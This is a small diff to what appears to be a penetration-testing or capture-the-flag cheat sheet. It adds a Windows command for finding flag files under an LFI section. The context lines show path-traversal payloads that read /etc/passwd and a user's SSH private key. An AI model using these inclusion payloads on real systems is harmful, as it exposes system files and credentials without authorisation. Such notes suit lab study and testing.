@@ -269,6 +269,10 @@ LFI
 	website/home/?page=/../../../etc/passwd
 	website/home/?page=/../../../home/falcon/.ssh/id_rsa
 	
+Searching in Windows Machine
+	
+	dir flag* /s /p
+
 # @cc github.com/prakashchand72
 
 
